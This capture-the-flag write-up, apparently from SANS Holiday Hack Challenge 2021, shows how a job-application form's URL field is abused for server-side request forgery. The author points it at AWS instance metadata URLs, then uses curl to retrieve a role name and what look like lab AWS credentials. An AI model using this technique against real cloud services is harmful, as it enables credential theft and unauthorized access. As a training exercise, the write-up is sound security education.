# Objective 10: Now Hiring!
**Location: https://apply.jackfrosttower.com/**  
**Hints provided by Noxious O. D'or after completion of [IMDS Exploration](https://github.com/joergschwarzwaelder/hhc2021/blob/master/Additional/IMDS%20Exploration.md)**

This objective is about SSRF to IMDS URLs.

The website's application form consumes the user's name, resume (as file upload) and the URL to the public NLBI report.

After the submission, the item specified by the URL is retrieved by the website and then shown on the "submission accepted" screen using the URL https://apply.jackfrosttower.com/images/{username}.jpg

By choosing the right IMDS URLs, the secret access key for the S3 bucket can be retrieved using CURL:

URL 1 (get role name):
```
http://169.254.169.254/latest/meta-data/iam/security-credentials
```
Result:
```
joergen@northpole:~$ curl https://apply.jackfrosttower.com/images/joergen.jpg
jf-deploy-role
```

URL 2 (get security credentials for this role):
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role
```

```
joergen@northpole:~$ curl https://apply.jackfrosttower.com/images/joergen.jpg
```
```json
{
	"Code": "Success",
	"LastUpdated": "2021-05-02T18:50:40Z",
	"Type": "AWS-HMAC",
	"AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
	"SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
	"Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
	"Expiration": "2026-05-02T18:50:40Z"
}
```
So the secret access key for the S3 bucket is **CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX**

**Achievement: SSRF to IMDS to S3 Bucket Access**
